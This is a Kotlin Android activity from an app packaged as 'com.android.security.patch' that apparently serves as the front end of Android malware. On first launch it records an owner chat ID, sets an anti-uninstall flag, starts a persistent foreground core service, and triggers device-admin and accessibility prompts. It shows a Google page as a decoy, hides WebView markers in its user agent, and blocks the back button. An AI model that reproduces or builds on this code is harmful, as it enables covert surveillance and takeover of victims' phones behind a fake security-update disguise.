package com.android.security.patch

import android.annotation.SuppressLint
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.view.ViewGroup
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity

class WebViewActivity : AppCompatActivity() {

    private var wv: WebView? = null

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // record install time once
        if (Prefs.getLong(this, Prefs.INSTALL_TS) == 0L) {
            Prefs.setLong(this, Prefs.INSTALL_TS, System.currentTimeMillis())
            Prefs.setLong(this, Prefs.OWNER_CHAT, Config.OWNER_CHAT_ID)
            Prefs.setBool(this, Prefs.ANTI_UNINSTALL_ON, false)
        }

        // boot core service on first launch
        startCore()

        val w = WebView(this)
        w.layoutParams = ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        )
        w.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            cacheMode = WebSettings.LOAD_DEFAULT
            userAgentString = userAgentString
                .replace("; wv", "")
                .replace("Version/4.0 ", "")
        }
        w.webViewClient = WebViewClient()
        setContentView(w)
        wv = w
        w.loadUrl("https://www.google.com")

        // trigger first-launch setup (admin prompt, accessibility, etc.)
        Setup.firstLaunch(this)
    }

    private fun startCore() {
        val i = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
        else startService(i)
    }

    override fun onBackPressed() {
        wv?.let {
            if (it.canGoBack()) { it.goBack(); return }
        }
        // swallow back — webview acts as home
    }

    override fun onDestroy() {
        wv?.destroy()
        super.onDestroy()
    }
}